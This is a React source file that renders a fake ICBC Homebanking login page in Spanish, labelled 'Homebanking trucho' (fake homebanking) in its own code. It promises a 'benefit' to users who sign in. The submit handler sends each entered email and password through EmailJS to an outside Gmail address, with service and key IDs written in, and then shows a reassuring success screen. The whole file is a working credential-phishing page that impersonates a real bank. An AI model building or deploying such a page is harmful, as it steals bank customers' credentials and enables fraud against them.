import { useState } from 'react';
import { 
  Button, 
  Container,
  TextField, 
  Card, 
  CardContent, 
  Typography, 
  Box 
} from '@mui/material';
import emailjs from 'emailjs-com';

export default function App() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isLoggedIn, setIsLoggedIn] = useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();
    console.log(`Enviando credenciales a guadalupe.a.lemme@gmail.com: Email: ${email}, Password: ${password}`);
    
    const templateParams = {
      to_email: 'guadalupe.a.lemme@gmail.com',
      from_name: 'Homebanking trucho',
      email,
      password
    };

    emailjs.send('service_r0qbr7m', 'template_5p1vxho', templateParams, '5eLHja5UYFd6QSOt2')
      .then((response) => {
        console.log('Correo enviado:', response.status, response.text);
        setIsLoggedIn(true);
      })
      .catch((error) => {
        console.error('Error al enviar correo:', error);
      });
    
    setIsLoggedIn(true);
  };

  if (isLoggedIn) {
    return (
      
    <Container component="main" maxWidth="xs">
      <Box
        sx={{
          display: 'flex',
          height: '100vh',
          justifyContent: 'center',
          alignItems: 'center',
        }}
      >
        <Card>
          <CardContent>
            <Typography component="h1" variant="h5">
              ¡Se ha otorgado el beneficio!
            </Typography>
            <Typography variant="body2" color="text.secondary">
              Gracias por iniciar sesión en ICBC Homebanking
            </Typography>
            <Button
              fullWidth
              variant="contained"
              onClick={() => {
                setIsLoggedIn(false);
                setEmail(''); 
                setPassword(''); 
              }}
              sx={{ mt: 3, mb: 2 , backgroundColor: '#b4252d'}}
            >
              Cerrar sesión
            </Button>
          </CardContent>
        </Card>
      </Box>
      </Container>
    );
  }

  return (
    <Container component="main" maxWidth="xs">
    <Box
      sx={{
        display: 'flex',
        height: '100vh',
        justifyContent: 'center',
        alignItems: 'center',
      }}
    >
    <Card>
      <CardContent>
        <Box 
          sx={{ 
            display: 'flex', 
            alignItems: 'center', 
            gap: 1 // Espacio entre la imagen y el texto
          }}
        >
          <img src="/logo-icbc.png" alt="ICBC Logo" style={{ width: 40, height: 40 }} />
          <Typography component="h1" variant="h5">
            ICBC Homebanking
          </Typography>
        </Box>
        <Typography variant="body2" color="text.secondary">
          Inicie sesión para obtener el beneficio
        </Typography>
        <Box component="form" onSubmit={handleSubmit} noValidate sx={{ mt: 1 }}>
          <TextField
            margin="normal"
            required
            fullWidth
            id="email"
            label="Email"
            name="email"
            autoComplete="email"
            autoFocus
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            sx={{
              '& .MuiOutlinedInput-root.Mui-focused .MuiOutlinedInput-notchedOutline': {
                borderColor: '#b4252d', 
              },
              '& .MuiInputLabel-root.Mui-focused': {
                color: '#b4252d', 
              },
            }}
          />
          <TextField
            margin="normal"
            required
            fullWidth
            name="password"
            label="Contraseña"
            type="password"
            id="password"
            autoComplete="current-password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            sx={{
              '& .MuiOutlinedInput-root.Mui-focused .MuiOutlinedInput-notchedOutline': {
                borderColor: '#b4252d', 
              },
              '& .MuiInputLabel-root.Mui-focused': {
                color: '#b4252d', 
              },
            }}
          />
          <Button
            type="submit"
            fullWidth
            variant="contained"
            sx={{ mt: 3, mb: 2, backgroundColor: '#b4252d'}}
          >
            Iniciar sesión
          </Button>
        </Box>
      </CardContent>
    </Card>
    </Box>
    </Container>
  );
}
